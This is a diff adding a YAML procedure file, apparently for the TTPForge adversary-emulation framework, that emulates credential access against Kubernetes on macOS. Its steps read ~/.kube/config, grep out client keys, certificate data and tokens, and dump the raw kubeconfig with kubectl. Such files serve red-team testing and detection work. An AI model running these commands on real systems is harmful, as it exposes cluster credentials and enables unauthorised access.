@@ -1,0 +1,56 @@
+api_version: 2.0
+uuid: 12345678-1234-1234-1234-000000000015
+name: Kubernetes Config Access
+description: Access and extract Kubernetes configuration files and credentials
+author: TTPForge
+created: 2025-01-30
+tactics:
+  - Credential Access
+techniques:
+  - T1555
+requirements:
+  platforms:
+    - os: darwin
+args:
+  - name: kubeconfig_paths
+    description: Paths to kubeconfig files
+    default: "~/.kube/config:/etc/kubernetes/admin.conf"
+  - name: output_file
+    description: File to store extracted Kubernetes config
+    default: "/tmp/kubeconfig_extract.txt"
+steps:
+  - name: Check Kubeconfig Location
+    type: command
+    command: "test -f ~/.kube/config && echo 'Kubeconfig found' || echo 'Kubeconfig not found'"
+    
+  - name: Read Kubeconfig
+    type: command
+    command: "cat ~/.kube/config 2>/dev/null | grep -E 'certificate-authority-data|client-certificate-data|client-key-data|token' | head -30 || echo 'Kubeconfig not accessible'"
+    
+  - name: Query Cluster Information
+    type: command
+    command: "kubectl config view --raw 2>/dev/null || echo 'kubectl not available'"
+    
+  - name: List Kubernetes Contexts
+    type: command
+    command: "kubectl config get-contexts 2>/dev/null || echo 'No contexts available'"
+
+checks:
+  - type: file_exists
+    value: "~/.kube/config"
+    description: Verify kubeconfig file exists
+  - type: stdout_contains
+    value: "cluster"
+    description: Verify Kubernetes configuration accessed
+
+tests:
+  - name: Check Kubeconfig Access
+    description: Verify kubeconfig file accessibility
+    test_type: default
+    steps:
+      - "test -f ~/.kube/config && echo 'Kubeconfig accessible' || echo 'Check complete'"
+
+cleanup:
+  - type: command
+    command: "rm -f {{ output_file }}"
+    description: Remove extracted Kubernetes configuration
